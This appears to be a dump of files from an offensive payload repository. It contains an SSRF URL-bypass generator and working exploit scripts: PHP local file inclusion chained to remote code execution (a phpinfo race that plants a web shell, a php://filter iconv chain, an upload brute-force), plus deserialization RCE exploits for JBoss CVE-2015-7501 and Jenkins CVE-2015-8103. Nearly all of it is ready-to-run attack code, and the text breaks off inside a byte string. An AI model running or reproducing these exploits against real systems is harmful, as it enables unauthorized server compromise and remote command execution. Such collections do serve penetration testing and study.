'export':\n\tprint('http://',IP11,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP11,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP11,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'@',IP11,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP11,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP11,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP11,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP11,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP11,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP11,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP11,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP11,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP11,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP11,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP11,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP11,':',PORT,':80','/',file=f,sep='')\n\tprint('http://',IP11,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP11,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP11,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\n#Case 12 - Dotted octal with padding + Dotted hexadecimal + Dotless decimal\nprint(bluecolor,\"Dotted octal with padding + Dotted hexadecimal + Dotless decimal IP Address of:\",resetcolor,yellowcolor,\" http://\",arg1,resetcolor,bluecolor,\" + authentication prefix/bypass combo list\",resetcolor,sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nIP12 = '0' + OCT_SINGLE(ipFrag3) + \".\" + HEX_SINGLE(ipFrag2,\"yes\") + \".\" + str(DECIMAL_SINGLE(ipFrag1,1) + DECIMAL_SINGLE(ipFrag0,0))\nprint('http://',IP12,':',PORT,'/',sep='')\nprint('http://',IP12,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP12,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'@',IP12,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP12,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP12,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP12,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP12,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP12,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP12,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP12,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP12,':',PORT,'/',sep='')\nprint('http://',IP12,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP12,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP12,':',PORT,'/',sep='')\nprint('http://',IP12,':',PORT,':80','/',sep='')\nprint('http://',IP12,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP12,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP12,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nprint(\"\\n\",sep='')\nif EXPORTRESULTS == 'export':\n\tprint('http://',IP12,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP12,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP12,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'@',IP12,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP12,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP12,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP12,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP12,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP12,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP12,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP12,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP12,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP12,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP12,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP12,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP12,':',PORT,':80','/',file=f,sep='')\n\tprint('http://',IP12,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP12,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP12,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\n#Case 13 - Abusing IDNA Standard\nprint(bluecolor,\"Abusing IDNA Standard: \",resetcolor,yellowcolor,\"http://\u00df.localdomain.pw/\", resetcolor,' -> ',yellowcolor,'http://cc.localdomain.pw/',resetcolor,' => ',bluecolor,'DNS',resetcolor,' => ',yellowcolor,'127.127.127.127',resetcolor,sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nprint('http://\u00df.localdomain.pw/',sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nprint(\"\\n\",sep='')\nif EXPORTRESULTS == 'export':\n\tprint('http://\u00df.localdomain.pw/',file=f,sep='')\n\n#Case 14 - Abusing \u3002and \uff61\nIPAddressParts = arg1.split(\".\")\nprint(bluecolor,\"Abusing \u3002and \uff61: \",resetcolor,yellowcolor,\"http://\",IPAddressParts[0],\"\u3002\",IPAddressParts[1],\"\u3002\",IPAddressParts[2],\"\u3002\",IPAddressParts[3],\"/\",resetcolor,\" and \" ,yellowcolor,\"http://\",IPAddressParts[0],\"\uff61\",IPAddressParts[1],\"\uff61\",IPAddressParts[2],\"\uff61\",IPAddressParts[3],\"/\", resetcolor,' -> ',yellowcolor,\"http://\",IPAddressParts[0],\".\",IPAddressParts[1],\".\",IPAddressParts[2],\".\",IPAddressParts[3],\"/\",resetcolor,sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nprint('http://',IPAddressParts[0],'\u3002',IPAddressParts[1],'\u3002',IPAddressParts[2],'\u3002',IPAddressParts[3],'/',sep='')\nprint('http://',IPAddressParts[0],'\uff61',IPAddressParts[1],'\uff61',IPAddressParts[2],'\uff61',IPAddressParts[3],'/',sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nprint(\"\\n\",sep='')\nif EXPORTRESULTS == 'export':\n\tprint('http://',IPAddressParts[0],'\u3002',IPAddressParts[1],'\u3002',IPAddressParts[2],'\u3002',IPAddressParts[3],'/',file=f,sep='')\n\tprint('http://',IPAddressParts[0],'\uff61',IPAddressParts[1],'\uff61',IPAddressParts[2],'\uff61',IPAddressParts[3],'/',file=f,sep='')\n\n#Case 15 Abusing Enclosed Alphanumerics\nprint(bluecolor,\"Abusing Enclosed Alphanumerics:\",resetcolor,\" \",yellowcolor,'http://',convertIP2EnclosedAlphanumericsValue(), resetcolor,'        -> ',yellowcolor,\"http://\",arg1,resetcolor,sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nprint('http://',convertIP2EnclosedAlphanumericsValue(),'/',sep='')\nprint('http://',convert_ip(IP1),':',PORT,'/',sep='')\nprint('http://',convert_ip(IP2),':',PORT,'/',sep='')\nprint('http://',convert_ip(IP3),':',PORT,'/',sep='')\nprint('http://',convert_ip(IP4),':',PORT,'/',sep='')\nprint('http://',convert_ip(IP5),':',PORT,'/',sep='')\nprint('http://',convert_ip(IP6),':',PORT,'/',sep='')\nprint('http://',convert_ip(IP7),':',PORT,'/',sep='')\nprint('http://',convert_ip(IP8),':',PORT,'/',sep='')\nprint('http://',convert_ip(IP9),':',PORT,'/',sep='')\nprint('http://',convert_ip(IP10),':',PORT,'/',sep='')\nprint('http://',convert_ip(IP11),':',PORT,'/',sep='')\nprint('http://',convert_ip(IP12),':',PORT,'/',sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nprint(\"\\n\",sep='')\nif EXPORTRESULTS == 'export':\n\tprint('http://',convertIP2EnclosedAlphanumericsValue(),'/',file=f,sep='')\n\tprint('http://',convert_ip(IP1),':',PORT,'/',file=f,sep='')\n\tprint('http://',convert_ip(IP2),':',PORT,'/',file=f,sep='')\n\tprint('http://',convert_ip(IP3),':',PORT,'/',file=f,sep='')\n\tprint('http://',convert_ip(IP4),':',PORT,'/',file=f,sep='')\n\tprint('http://',convert_ip(IP5),':',PORT,'/',file=f,sep='')\n\tprint('http://',convert_ip(IP6),':',PORT,'/',file=f,sep='')\n\tprint('http://',convert_ip(IP7),':',PORT,'/',file=f,sep='')\n\tprint('http://',convert_ip(IP8),':',PORT,'/',file=f,sep='')\n\tprint('http://',convert_ip(IP9),':',PORT,'/',file=f,sep='')\n\tprint('http://',convert_ip(IP10),':',PORT,'/',file=f,sep='')\n\tprint('http://',convert_ip(IP11),':',PORT,'/',file=f,sep='')\n\tprint('http://',convert_ip(IP12),':',PORT,'/',file=f,sep='')\n\nif EXPORTRESULTS == 'export':\n\tf.close()\n\tprint(\"\\n\",bluecolor,'-----------------------------------------------------------------------------------------------------------------------------------------',resetcolor,sep='')\n\tprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\n\tprint(\"Results are exported to: \" + FILENAME,sep='')\n\tprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\n\tprint(bluecolor,'-----------------------------------------------------------------------------------------------------------------------------------------',resetcolor,sep='')\n\tprint(\"\\n\",sep='')\n", "File Inclusion/Files/phpinfolfi.py": "#!/usr/bin/python\n# https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf\n# The following line is not required but supposedly optimizes code.  \n# However, this breaks on some Python 2 installations, where the future module version installed is > 0.16.  This can be a pain to revert.\n# from builtins import range\nfrom __future__ import print_function\nimport sys\nimport threading\nimport socket\n\ndef setup(host, port):\n    TAG=\"Security Test\"\n    PAYLOAD=\"\"\"%s\\r\n<?php $c=fopen('/tmp/g','w');fwrite($c,'<?php passthru($_GET[\"f\"]);?>');?>\\r\"\"\" % TAG\n    REQ1_DATA=\"\"\"-----------------------------7dbff1ded0714\\r\nContent-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\\r\nContent-Type: text/plain\\r\n\\r\n%s\n-----------------------------7dbff1ded0714--\\r\"\"\" % PAYLOAD\n    padding=\"A\" * 5000\n    REQ1=\"\"\"POST /phpinfo.php?a=\"\"\"+padding+\"\"\" HTTP/1.1\\r\nCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=\"\"\"+padding+\"\"\"\\r\nHTTP_ACCEPT: \"\"\" + padding + \"\"\"\\r\nHTTP_USER_AGENT: \"\"\"+padding+\"\"\"\\r\nHTTP_ACCEPT_LANGUAGE: \"\"\"+padding+\"\"\"\\r\nHTTP_PRAGMA: \"\"\"+padding+\"\"\"\\r\nContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\r\nContent-Length: %s\\r\nHost: %s\\r\n\\r\n%s\"\"\" %(len(REQ1_DATA),host,REQ1_DATA)\n    #modify this to suit the LFI script\n    LFIREQ=\"\"\"GET /lfi.php?load=%s%%00 HTTP/1.1\\r\nUser-Agent: Mozilla/4.0\\r\nProxy-Connection: Keep-Alive\\r\nHost: %s\\r\n\\r\n\\r\n\"\"\"\n    return (REQ1, TAG, LFIREQ)\n\ndef phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    s.connect((host, port))\n    s2.connect((host, port))\n\n    s.send(phpinforeq)\n    d = \"\"\n    while len(d) < offset:\n        d += s.recv(offset)\n    try:\n        i = d.index(\"[tmp_name] =>\")\n        if i == -1:\n            i = d.index(\"[tmp_name] =&gt;\")\n        fn = d[i+17:i+31]\n    except ValueError:\n        return None\n\n    s2.send(lfireq % (fn, host))\n    d = s2.recv(4096)\n    s.close()\n    s2.close()\n\n    if d.find(tag) != -1:\n        return fn\n\ncounter=0\nclass ThreadWorker(threading.Thread):\n    def __init__(self, e, l, m, *args):\n        threading.Thread.__init__(self)\n        self.event = e\n        self.lock =  l\n        self.maxattempts = m\n        self.args = args\n\n    def run(self):\n        global counter\n        while not self.event.is_set():\n            with self.lock:\n                if counter >= self.maxattempts:\n                    return\n                counter+=1\n\n            try:\n                x = phpInfoLFI(*self.args)\n                if self.event.is_set():\n                    break\n                if x:\n                    print(\"\\nGot it! Shell created in /tmp/g\")\n                    self.event.set()\n\n            except socket.error:\n                return\n\n\ndef getOffset(host, port, phpinforeq):\n    \"\"\"Gets offset of tmp_name in the php output\"\"\"\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((host,port))\n    s.send(phpinforeq)\n\n    d = \"\"\n    while True:\n        i = s.recv(4096)\n        d+=i\n        if i == \"\":\n            break\n        # detect the final chunk\n        if i.endswith(\"0\\r\\n\\r\\n\"):\n            break\n    s.close()\n    i = d.find(\"[tmp_name] =>\")\n    if i == -1:\n        i = d.find(\"[tmp_name] =&gt;\")\n    if i == -1:\n        raise ValueError(\"No php tmp_name in phpinfo output\")\n\n    print(\"found %s at %i\" % (d[i:i+10],i))\n    # padded up a bit\n    return i+256\n\ndef main():\n\n    print(\"LFI With PHPInfo()\")\n    print(\"-=\" * 30)\n\n    if len(sys.argv) < 2:\n        print(\"Usage: %s host [port] [threads]\" % sys.argv[0])\n        sys.exit(1)\n\n    try:\n        host = socket.gethostbyname(sys.argv[1])\n    except socket.error as e:\n        print(\"Error with hostname %s: %s\" % (sys.argv[1], e))\n        sys.exit(1)\n\n    port=80\n    try:\n        port = int(sys.argv[2])\n    except IndexError:\n        pass\n    except ValueError as e:\n        print(\"Error with port %d: %s\" % (sys.argv[2], e))\n        sys.exit(1)\n\n    poolsz=10\n    try:\n        poolsz = int(sys.argv[3])\n    except IndexError:\n        pass\n    except ValueError as e:\n        print(\"Error with poolsz %d: %s\" % (sys.argv[3], e))\n        sys.exit(1)\n\n    print(\"Getting initial offset...\", end=' ')\n    reqphp, tag, reqlfi = setup(host, port)\n    offset = getOffset(host, port, reqphp)\n    sys.stdout.flush()\n\n    maxattempts = 1000\n    e = threading.Event()\n    l = threading.Lock()\n\n    print(\"Spawning worker pool (%d)...\" % poolsz)\n    sys.stdout.flush()\n\n    tp = []\n    for i in range(0,poolsz):\n        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))\n\n    for t in tp:\n        t.start()\n    try:\n        while not e.wait(1):\n            if e.is_set():\n                break\n            with l:\n                sys.stdout.write( \"\\r% 4d / % 4d\" % (counter, maxattempts))\n                sys.stdout.flush()\n                if counter >= maxattempts:\n                    break\n        print()\n        if e.is_set():\n            print(\"Woot!  \\m/\")\n        else:\n            print(\":(\")\n    except KeyboardInterrupt:\n        print(\"\\nTelling threads to shutdown...\")\n        e.set()\n\n    print(\"Shuttin' down...\")\n    for t in tp:\n        t.join()\n\nif __name__==\"__main__\":\n    print(\"Don't forget to modify the LFI URL\")\n    main()", "File Inclusion/Files/LFI2RCE.py": "import requests\n\nurl = \"http://localhost:8000/chall.php\"\nfile_to_use = \"/etc/passwd\"\ncommand = \"id\"\n\n#<?=`$_GET[0]`;;?>\nbase64_payload = \"PD89YCRfR0VUWzBdYDs7Pz4\"\n\nconversions = {\n    'R': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2',\n    'B': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2',\n    'C': 'convert.iconv.UTF8.CSISO2022KR',\n    '8': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',\n    '9': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB',\n    'f': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213',\n    's': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61',\n    'z': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS',\n    'U': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932',\n    'P': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213',\n    'V': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5',\n    '0': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',\n    'Y': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2',\n    'W': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2',\n    'd': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2',\n    'D': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2',\n    '7': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2',\n    '4': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'\n}\n\n\n# generate some garbage base64\nfilters = \"convert.iconv.UTF8.CSISO2022KR|\"\nfilters += \"convert.base64-encode|\"\n# make sure to get rid of any equal signs in both the string we just generated and the rest of the file\nfilters += \"convert.iconv.UTF8.UTF7|\"\n\n\nfor c in base64_payload[::-1]:\n        filters += conversions[c] + \"|\"\n        # decode and reencode to get rid of everything that isn't valid base64\n        filters += \"convert.base64-decode|\"\n        filters += \"convert.base64-encode|\"\n        # get rid of equal signs\n        filters += \"convert.iconv.UTF8.UTF7|\"\n\nfilters += \"convert.base64-decode\"\n\nfinal_payload = f\"php://filter/{filters}/resource={file_to_use}\"\n\nwith open('payload', 'w') as f:\n    f.write(final_payload)\n\nr = requests.get(url, params={\n    \"0\": command,\n    \"action\": \"include\",\n    \"file\": final_payload\n})\n\nprint(r.text)", "File Inclusion/Files/uploadlfi.py": "from __future__ import print_function\nfrom builtins import range\nimport itertools\nimport requests\nimport string\nimport sys\n\nprint('[+] Trying to win the race')\nf = {'file': open('shell.php', 'rb')}\nfor _ in range(4096 * 4096):\n    requests.post('http://target.com/index.php?c=index.php', f)\n\n\nprint('[+] Bruteforcing the inclusion')\nfor fname in itertools.combinations(string.ascii_letters + string.digits, 6):\n    url = 'http://target.com/index.php?c=/tmp/php' + fname\n    r = requests.get(url)\n    if 'load average' in r.text:  # <?php echo system('uptime');\n        print('[+] We have got a shell: ' + url)\n        sys.exit(0)\n\nprint('[x] Something went wrong, please try again')\n", "CVE Exploits/JBoss CVE-2015-7501.py": "#! /usr/bin/env python2\n\n# Jboss Java Deserialization RCE (CVE-2015-7501)\n# Made with <3 by @byt3bl33d3r\n\nfrom __future__ import print_function\nimport requests\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nimport argparse\nimport sys, os\n#from binascii import hexlify, unhexlify\nfrom subprocess import check_output\n\nysoserial_default_paths = ['./ysoserial.jar', '../ysoserial.jar']\nysoserial_path = None\n\nparser = argparse.ArgumentParser()\nparser.add_argument('target', type=str, help='Target IP')\nparser.add_argument('command', type=str, help='Command to run on target')\nparser.add_argument('--proto', choices={'http', 'https'}, default='http', help='Send exploit over http or https (default: http)')\nparser.add_argument('--ysoserial-path', metavar='PATH', type=str, help='Path to ysoserial JAR (default: tries current and previous directory)')\n\nif len(sys.argv) < 2:\n    parser.print_help()\n    sys.exit(1)\n\nargs = parser.parse_args()\n\nif not args.ysoserial_path:\n    for path in ysoserial_default_paths:\n        if os.path.exists(path):\n            ysoserial_path = path\nelse:\n    if os.path.exists(args.ysoserial_path):\n        ysoserial_path = args.ysoserial_path\n\nif ysoserial_path is None:\n    print('[-] Could not find ysoserial JAR file')\n    sys.exit(1)\n\nif len(args.target.split(\":\")) != 2:\n    print('[-] Target must be in format IP:PORT')\n    sys.exit(1)\n\nif not args.command:\n    print('[-] You must specify a command to run')\n    sys.exit(1)\n\nip, port = args.target.split(':')\n\nprint('[*] Target IP: {}'.format(ip))\nprint('[*] Target PORT: {}'.format(port))\n\ngadget = check_output(['java', '-jar', ysoserial_path, 'CommonsCollections1', args.command])\n\nr = requests.post('{}://{}:{}/invoker/JMXInvokerServlet'.format(args.proto, ip, port), verify=False, data=gadget)\n\nif r.status_code == 200:\n    print('[+] Command executed successfully')\n\n", "CVE Exploits/Jenkins CVE-2015-8103.py": "#! /usr/bin/env python2\n\n#Jenkins CLI RMI Java Deserialization RCE (CVE-2015-8103)\n#Based on the PoC by FoxGlove Security (https://github.com/foxglovesec/JavaUnserializeExploits)\n#Made with <3 by @byt3bl33d3r\n\nfrom __future__ import print_function\nimport requests\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nimport socket\nimport sys\nimport base64\nimport argparse\nimport os\nfrom subprocess import check_output\n\nysoserial_default_paths = ['./ysoserial.jar', '../ysoserial.jar']\nysoserial_path = None\n\nparser = argparse.ArgumentParser()\nparser.add_argument('target', type=str, help='Target IP:PORT')\nparser.add_argument('command', type=str, help='Command to run on target')\nparser.add_argument('--proto', choices={'http', 'https'}, default='http', help='Send exploit over http or https (default: http)')\nparser.add_argument('--ysoserial-path', metavar='PATH', type=str, help='Path to ysoserial JAR (default: tries current and previous directory)')\n\nif len(sys.argv) < 2:\n    parser.print_help()\n    sys.exit(1)\n\nargs = parser.parse_args()\n\nif not args.ysoserial_path:\n    for path in ysoserial_default_paths:\n        if os.path.exists(path):\n            ysoserial_path = path\nelse:\n    if os.path.exists(args.ysoserial_path):\n        ysoserial_path = args.ysoserial_path\n\nif ysoserial_path is None:\n    print(\"[-] Could not find ysoserial JAR file\")\n    sys.exit(1)\n\nif len(args.target.split(':')) != 2:\n    print('[-] Target must be in format IP:PORT')\n    sys.exit(1)\n\nif not args.command:\n    print('[-] You must specify a command to run')\n    sys.exit(1)\n\nhost, port = args.target.split(':')\n\nprint('[*] Target IP: {}'.format(host))\nprint('[*] Target PORT: {}'.format(port))\nprint('\\n')\n\nprint('[*] Retrieving the Jenkins CLI port')\n#Query Jenkins over HTTP to find what port the CLI listener is on\nr = requests.get('{}://{}:{}'.format(args.proto, host, port))\ncli_port = int(r.headers['X-Jenkins-CLI-Port'])\n\n#Open a socket to the CLI port\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_address = (host, cli_port)\nprint('[*] Connecting to Jenkins CLI on {}:{}'.format(host, cli_port))\nsock.connect(server_address)\n\n# Send headers\nheaders='\\x00\\x14\\x50\\x72\\x6f\\x74\\x6f\\x63\\x6f\\x6c\\x3a\\x43\\x4c\\x49\\x2d\\x63\\x6f\\x6e\\x6e\\x65\\x63\\x74'\nprint('[*] Sending headers')\nsock.send(headers)\n\ndata = sock.recv(1024)\nprint('[*] Received \"{}\"'.format(data))\n\nif data.find('JENKINS REMOTING CAPACITY') == -1:\n    data = sock.recv(1024)\n    print('[*] Received \"{}\"'.format(data))\n\npayloadObj = check_output(['java', '-jar', ysoserial_path, 'CommonsCollections3', args.command])\npayload_b64 = base64.b64encode(payloadObj)\npayload='\\x3c\\x3d\\x3d\\x3d\\x5b\\x4a\\x45\\x4e\\x4b\\x49\\x4e\\x53\\x20\\x52\\x45\\x4d\\x4f\\x54\\x49\\x4e\\x47\\x20\\x43\\x41\\x50\\x41\\x43\\x49\\x54\\x59\\x5d\\x3d\\x3d\\x3d\\x3e'+payload_b64+'\\x00\\x00\\x00\\x00\\x11\\x2d\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1b\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x55\\x73\\x65\\x72\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x03\\x4c\\x00\\x10\\x63\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x50\\x72\\x6f\\x78\\x79\\x74\\x00\\x30\\x4c\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2f\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2f\\x52\\x65\\x6d\\x6f\\x74\\x65\\x43\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x24\\x49\\x43\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x3b\\x5b\\x00\\x07\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x74\\x00\\x02\\x5b\\x42\\x4c\\x00\\x08\\x74\\x6f\\x53\\x74\\x72\\x69\\x6e\\x67\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x78\\x72\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x03\\x49\\x00\\x02\\x69\\x64\\x49\\x00\\x08\\x6c\\x61\\x73\\x74\\x49\\x6f\\x49\\x64\\x4c\\x00\\x08\\x72\\x65\\x73\\x70\\x6f\\x6e\\x73\\x65\\x74\\x00\\x1a\\x4c\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2f\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2f\\x52\\x65\\x73\\x70\\x6f\\x6e\\x73\\x65\\x3b\\x78\\x72\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x43\\x6